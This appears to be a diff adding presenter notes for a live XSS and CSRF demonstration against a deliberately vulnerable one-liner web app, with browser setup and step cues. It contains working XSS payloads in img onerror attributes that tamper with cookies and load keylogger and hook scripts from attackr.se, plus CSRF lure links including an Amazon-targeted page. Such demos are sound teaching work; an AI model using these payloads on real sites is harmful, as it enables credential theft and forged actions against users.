@@ -1,0 +1,37 @@
+BadGuy
+Chrome	https://local.1-liner.org:8444/vulnerable/
+		https://local.1-liner.org:8444/admin/          <-- Change name
+                https://attackr.se:8444                <-- Accept cert
+                https://lolsite.com:8444               <-- Accept cert
+John
+FF	    https://local.1-liner.org:8444/vulnerable/
+                https://attackr.se:8444                <-- Accept cert
+                https://lolsite.com:8444               <-- Accept cert
+
+*** XSS fight
+
+Show username "John" in FF
+
+I love JavaScript<img src=1 onerror=if(Ext.util.Cookies.get("nickNameVulnerable")!="BadGuy"){Ext.util.Cookies.set("nickNameVulnerable","Moron");} height=0 width=0 />
+
+It's EcmaScript, fool<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/keylogger.js') height=0 width=0 />
+
+Besserwisser<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/hook.js') height=0 width=0 />
+
+*** Remove XSS, reload John, and switch to BadGuy
+
+//  "oneLiner": $.encoder.encodeForHTML(oneLinerStr),  // Proper encoding
+
+Besserwisser<img src=1 onerror=$.getScript('https://attackr.se:8444/attacks/hook.js') height=0 width=0 />
+
+*** Remove encoding fix and switch to BadGuy
+
+LOL, check the dancing pig: https://lolsite.com:8444/attacks/csrf/csrf.html
+
+Über LOL, check out the cat: https://lolsite.com:8444/attacks/csrf/csrf2.html
+
+*** Make sure BadGuy is logged in at Amazon
+
+John (FF) to BadGuy (Chrome):
+
+Hey BadGuy, check this out: https://attackr.se:8444/attacks/csrf/amazon/csrfMultiDriver.html
